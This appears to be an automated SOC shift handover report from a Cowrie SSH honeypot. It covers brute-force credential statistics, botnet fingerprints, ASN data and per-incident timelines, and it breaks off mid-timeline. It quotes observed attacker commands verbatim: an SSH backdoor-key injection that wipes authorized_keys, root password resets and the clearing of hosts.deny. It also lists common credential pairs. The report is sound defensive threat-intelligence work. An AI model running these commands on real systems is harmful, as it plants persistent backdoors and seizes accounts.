# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-20 |
| **Generated At** | 2026-05-20T21:59:46Z |
| **Shift Time** | 21:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1254** |
| Confirmed Threats | **1248** |
| False Positives Filtered | **6** (0.5%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **14** |
| High Severity Cases | **168** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1086** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **331** |
| Unique Credential Pairs | **123** |
| Unique Usernames | **61** |
| Unique Passwords | **114** |
| Successful Auth Pairs | **103** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 168 |
| `345gs5662d34` | 78 |
| `admin` | 5 |
| `mysql` | 4 |
| `ubuntu` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 81 |
| `345gs5662d34` | 78 |
| `123456` | 11 |
| `Dd112211` | 4 |
| `LeitboGi0ro` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 81 |
| `345gs5662d34` | `345gs5662d34` | 78 |
| `root` | `Dd112211` | 4 |
| `root` | `LeitboGi0ro` | 3 |
| `mysql` | `root` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `666666` | `112.123.106.167` | 2026-05-20T19:03:39 |
| `root` | `redhat123456` | `40.82.214.8` | 2026-05-20T19:30:15 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-05-20T19:30:22 |
| `root` | `blackdog` | `40.82.214.8` | 2026-05-20T19:32:04 |
| `root` | `sipwise` | `40.82.214.8` | 2026-05-20T19:34:01 |
| `root` | `!QAZcde3` | `40.82.214.8` | 2026-05-20T19:39:40 |
| `root` | `Dd112211` | `115.247.181.68` | 2026-05-20T19:40:38 |
| `root` | `3245gs5662d34` | `125.16.137.243` | 2026-05-20T19:40:40 |
| `root` | `Windows@123` | `40.82.214.8` | 2026-05-20T19:41:33 |
| `root` | `xianyu` | `125.16.137.243` | 2026-05-20T19:43:18 |
| `root` | `3245gs5662d34` | `115.247.181.68` | 2026-05-20T19:43:20 |
| `root` | `yangfan` | `40.82.214.8` | 2026-05-20T19:43:32 |
| `root` | `classified` | `115.247.181.68` | 2026-05-20T19:44:38 |
| `root` | `eng123` | `128.78.143.196` | 2026-05-20T19:44:49 |
| `root` | `3245gs5662d34` | `128.78.143.196` | 2026-05-20T19:45:01 |
| `root` | `LeitboGi0ro` | `40.82.214.8` | 2026-05-20T19:45:29 |
| `root` | `wanan` | `125.16.137.243` | 2026-05-20T19:46:00 |
| `root` | `eng123` | `125.16.137.243` | 2026-05-20T19:47:21 |
| `root` | `pa55word` | `125.16.137.243` | 2026-05-20T19:48:38 |
| `root` | `clear` | `40.82.214.8` | 2026-05-20T19:49:21 |
| `root` | `joshua` | `125.16.137.243` | 2026-05-20T19:51:10 |
| `root` | `1q2w3e4r...` | `61.222.211.114` | 2026-05-20T19:51:58 |
| `root` | `3245gs5662d34` | `61.222.211.114` | 2026-05-20T19:52:02 |
| `root` | `wanan` | `128.78.143.196` | 2026-05-20T19:52:38 |
| `root` | `rei123` | `172.191.239.155` | 2026-05-20T19:52:55 |
| `root` | `3245gs5662d34` | `172.191.239.155` | 2026-05-20T19:53:00 |
| `root` | `netapp123` | `196.92.7.246` | 2026-05-20T19:53:42 |
| `root` | `3245gs5662d34` | `196.92.7.246` | 2026-05-20T19:53:45 |
| `root` | `LeitboGi0ro` | `172.191.239.155` | 2026-05-20T19:54:06 |
| `root` | `xianyu` | `128.78.143.196` | 2026-05-20T19:54:30 |
| `root` | `u1s1` | `222.172.32.246` | 2026-05-20T19:54:38 |
| `root` | `3245gs5662d34` | `222.172.32.246` | 2026-05-20T19:54:49 |
| `root` | `root123root` | `40.82.214.8` | 2026-05-20T19:55:08 |
| `root` | `testing@123` | `196.92.7.246` | 2026-05-20T19:55:58 |
| `root` | `testing@123` | `172.191.239.155` | 2026-05-20T19:56:31 |
| `root` | `TEST` | `81.192.138.65` | 2026-05-20T19:57:09 |
| `root` | `3245gs5662d34` | `196.92.7.247` | 2026-05-20T19:57:13 |
| `root` | `wocao` | `125.16.137.243` | 2026-05-20T19:57:36 |
| `root` | `Killer` | `172.191.239.155` | 2026-05-20T19:57:51 |
| `root` | `zxcasdqwe!` | `196.92.7.247` | 2026-05-20T19:58:23 |
| `root` | `3245gs5662d34` | `154.144.225.226` | 2026-05-20T19:58:27 |
| `root` | `2005` | `125.16.137.243` | 2026-05-20T19:58:57 |
| `root` | `zxcasdqwe!` | `172.191.239.155` | 2026-05-20T19:59:14 |
| `root` | `kk` | `196.92.7.247` | 2026-05-20T19:59:35 |
| `root` | `Qaz!@#123` | `154.144.225.226` | 2026-05-20T20:00:46 |
| `root` | `20240520` | `222.172.32.246` | 2026-05-20T20:01:12 |
| `root` | `rei123` | `196.92.7.249` | 2026-05-20T20:01:53 |
| `root` | `abcqwe123` | `40.82.214.8` | 2026-05-20T20:02:38 |
| `root` | `kk` | `172.191.239.155` | 2026-05-20T20:03:13 |
| `root` | `2005` | `128.78.143.196` | 2026-05-20T20:04:01 |
| `root` | `P@5sw0rd` | `196.92.7.249` | 2026-05-20T20:04:07 |
| `root` | `qwe321` | `40.82.214.8` | 2026-05-20T20:04:26 |
| `root` | `121314` | `154.144.225.226` | 2026-05-20T20:05:17 |
| `root` | `3245gs5662d34` | `81.192.138.65` | 2026-05-20T20:05:21 |
| `root` | `TEST` | `172.191.239.155` | 2026-05-20T20:05:58 |
| `root` | `WindowsServer2023` | `40.82.214.8` | 2026-05-20T20:06:21 |
| `root` | `root@` | `172.191.239.155` | 2026-05-20T20:08:30 |
| `root` | `root@` | `196.92.7.249` | 2026-05-20T20:08:37 |
| `root` | `3245gs5662d34` | `196.92.7.249` | 2026-05-20T20:08:41 |
| `root` | `wocao` | `128.78.143.196` | 2026-05-20T20:09:39 |
| `root` | `LeitboGi0ro` | `196.92.7.249` | 2026-05-20T20:09:44 |
| `root` | `netapp123` | `172.191.239.155` | 2026-05-20T20:09:47 |
| `root` | `testpassword` | `40.82.214.8` | 2026-05-20T20:10:12 |
| `root` | `1q2w3e4r` | `154.144.225.226` | 2026-05-20T20:10:54 |
| `root` | `Dd112211` | `128.78.143.196` | 2026-05-20T20:11:35 |
| `root` | `qweasd!@#` | `45.78.198.19` | 2026-05-20T20:11:49 |
| `root` | `3245gs5662d34` | `45.78.198.19` | 2026-05-20T20:11:52 |
| `root` | `QWErty123!@#` | `40.82.214.8` | 2026-05-20T20:12:05 |
| `root` | `diego` | `196.92.7.249` | 2026-05-20T20:16:33 |
| `root` | `classified` | `128.78.143.196` | 2026-05-20T20:17:36 |
| `root` | `----` | `40.82.214.8` | 2026-05-20T20:17:49 |
| `root` | `!QAZ@wsx` | `196.92.7.246` | 2026-05-20T20:18:53 |
| `root` | `diego` | `172.191.239.155` | 2026-05-20T20:19:38 |
| `root` | `host@1234` | `40.82.214.8` | 2026-05-20T20:19:45 |
| `root` | `test@test` | `154.144.225.226` | 2026-05-20T20:19:59 |
| `root` | `Qaz!@#123` | `172.191.239.155` | 2026-05-20T20:21:03 |
| `root` | `qazxswedc123` | `196.92.7.246` | 2026-05-20T20:21:03 |
| `root` | `dev123456` | `154.144.225.226` | 2026-05-20T20:22:10 |
| `root` | `test@test` | `172.191.239.155` | 2026-05-20T20:22:24 |
| `root` | `Killer` | `196.92.7.249` | 2026-05-20T20:24:32 |
| `root` | `P@5sw0rd` | `172.191.239.155` | 2026-05-20T20:25:13 |
| `root` | `121314` | `172.191.239.155` | 2026-05-20T20:26:33 |
| `root` | `!QAZ@wsx` | `172.191.239.155` | 2026-05-20T20:27:55 |
| `root` | `1q2w3e4r` | `172.191.239.155` | 2026-05-20T20:29:18 |
| `root` | `qazxswedc123` | `172.191.239.155` | 2026-05-20T20:30:43 |
| `root` | `dev123456` | `172.191.239.155` | 2026-05-20T20:32:06 |
| `root` | `jd` | `186.219.184.142` | 2026-05-20T20:54:16 |
| `root` | `3245gs5662d34` | `186.219.184.142` | 2026-05-20T20:54:23 |
| `root` | `2fa` | `186.219.184.142` | 2026-05-20T20:55:50 |
| `root` | `tengxunshipin` | `186.219.184.142` | 2026-05-20T20:58:57 |
| `root` | `dong` | `186.219.184.142` | 2026-05-20T21:00:26 |
| `root` | `Dd112211` | `186.219.184.142` | 2026-05-20T21:06:40 |
| `root` | `conoha123` | `186.219.184.142` | 2026-05-20T21:09:39 |
| `root` | `May2024` | `14.103.102.130` | 2026-05-20T21:11:09 |
| `root` | `3245gs5662d34` | `14.103.102.130` | 2026-05-20T21:11:13 |
| `root` | `yingyong` | `14.103.102.130` | 2026-05-20T21:12:33 |
| `root` | `Dd112211` | `14.103.41.98` | 2026-05-20T21:16:06 |
| `root` | `xianggang` | `14.103.102.130` | 2026-05-20T21:18:12 |
| `root` | `dashuju` | `14.103.102.130` | 2026-05-20T21:19:35 |
| `root` | `Spring2024` | `42.51.41.252` | 2026-05-20T21:21:46 |
| `root` | `admin2024` | `42.51.41.252` | 2026-05-20T21:30:27 |
| `root` | `3245gs5662d34` | `42.51.41.252` | 2026-05-20T21:30:31 |
| `root` | `yingyong` | `42.51.41.252` | 2026-05-20T21:31:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1254** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 374 |
| Go SSH scanner | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 326 | 15 |
| `af8223ac9914...` | libssh-based | 28 | 2 |
| `03a80b21afa8...` | Modern SSH client | 16 | 3 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |
| `0a07365cc01f...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 326 | 15 | Mirai/variant |
| `af8223ac9914...` | libssh | 28 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 16 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `713bd9cc9355...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 81 | 16 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:B0Bc3vWCuaqD"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `42.51.41.252`, `128.78.143.196`, `14.103.41.98`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:gWLKfJB97jDP"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `42.51.41.252`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `81.192.138.65`, `222.172.32.246`, `196.92.7.249`, `42.51.41.252`, `40.82.214.8`, `154.144.225.226`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **25** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS6713` | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (168)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5dd1dfd58cfe

| Field | Detail |
|---|---|
| **Source IP** | `112.123.106[.]167` |
| **First Seen** | 2026-05-20 19:03 |
| **Last Seen** | 2026-05-20 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:03:39` | `cowrie.session.connect` |
| `2026-05-20 19:03:39` | `cowrie.login.success` |
| `2026-05-20 19:03:39` | `cowrie.session.params` |
| `2026-05-20 19:03:39` | `cowrie.log.closed` |
| `2026-05-20 19:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.123.106[.]167` to AbuseIPDB if not already reported
- [ ] Block `112.123.106[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e769c4275d

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:30 |
| **Last Seen** | 2026-05-20 19:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:30:12` | `cowrie.session.connect` |
| `2026-05-20 19:30:12` | `cowrie.client.version` |
| `2026-05-20 19:30:12` | `cowrie.client.kex` |
| `2026-05-20 19:30:15` | `cowrie.login.success` |
| `2026-05-20 19:30:16` | `cowrie.session.params` |
| `2026-05-20 19:30:16` | `cowrie.command.input` |
| `2026-05-20 19:30:16` | `cowrie.command.failed` |
| `2026-05-20 19:30:16` | `cowrie.log.closed` |
| `2026-05-20 19:30:17` | `cowrie.session.params` |
| `2026-05-20 19:30:17` | `cowrie.command.input` |
| `2026-05-20 19:30:17` | `cowrie.session.file_download` |
| `2026-05-20 19:30:17` | `cowrie.log.closed` |
| `2026-05-20 19:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae68e3066f3c

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:30 |
| **Last Seen** | 2026-05-20 19:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:30:20` | `cowrie.session.connect` |
| `2026-05-20 19:30:20` | `cowrie.client.version` |
| `2026-05-20 19:30:20` | `cowrie.client.kex` |
| `2026-05-20 19:30:22` | `cowrie.login.success` |
| `2026-05-20 19:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69753b6171bc

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:32 |
| **Last Seen** | 2026-05-20 19:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:32:03` | `cowrie.session.connect` |
| `2026-05-20 19:32:03` | `cowrie.client.version` |
| `2026-05-20 19:32:04` | `cowrie.client.kex` |
| `2026-05-20 19:32:04` | `cowrie.login.success` |
| `2026-05-20 19:32:05` | `cowrie.session.params` |
| `2026-05-20 19:32:05` | `cowrie.command.input` |
| `2026-05-20 19:32:05` | `cowrie.command.failed` |
| `2026-05-20 19:32:06` | `cowrie.log.closed` |
| `2026-05-20 19:32:06` | `cowrie.session.params` |
| `2026-05-20 19:32:06` | `cowrie.command.input` |
| `2026-05-20 19:32:06` | `cowrie.session.file_download` |
| `2026-05-20 19:32:06` | `cowrie.log.closed` |
| `2026-05-20 19:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a644d2ab082c

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:32 |
| **Last Seen** | 2026-05-20 19:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:32:10` | `cowrie.session.connect` |
| `2026-05-20 19:32:10` | `cowrie.client.version` |
| `2026-05-20 19:32:10` | `cowrie.client.kex` |
| `2026-05-20 19:32:11` | `cowrie.login.success` |
| `2026-05-20 19:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c77b7d85127

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:34 |
| **Last Seen** | 2026-05-20 19:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:34:00` | `cowrie.session.connect` |
| `2026-05-20 19:34:00` | `cowrie.client.version` |
| `2026-05-20 19:34:00` | `cowrie.client.kex` |
| `2026-05-20 19:34:01` | `cowrie.login.success` |
| `2026-05-20 19:34:02` | `cowrie.session.params` |
| `2026-05-20 19:34:02` | `cowrie.command.input` |
| `2026-05-20 19:34:02` | `cowrie.command.failed` |
| `2026-05-20 19:34:02` | `cowrie.log.closed` |
| `2026-05-20 19:34:03` | `cowrie.session.params` |
| `2026-05-20 19:34:03` | `cowrie.command.input` |
| `2026-05-20 19:34:03` | `cowrie.session.file_download` |
| `2026-05-20 19:34:03` | `cowrie.log.closed` |
| `2026-05-20 19:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c399c9f200

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:34 |
| **Last Seen** | 2026-05-20 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:34:06` | `cowrie.session.connect` |
| `2026-05-20 19:34:06` | `cowrie.client.version` |
| `2026-05-20 19:34:06` | `cowrie.client.kex` |
| `2026-05-20 19:34:07` | `cowrie.login.success` |
| `2026-05-20 19:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db7fec23a190

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:39 |
| **Last Seen** | 2026-05-20 19:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:39:39` | `cowrie.session.connect` |
| `2026-05-20 19:39:39` | `cowrie.client.version` |
| `2026-05-20 19:39:39` | `cowrie.client.kex` |
| `2026-05-20 19:39:40` | `cowrie.login.success` |
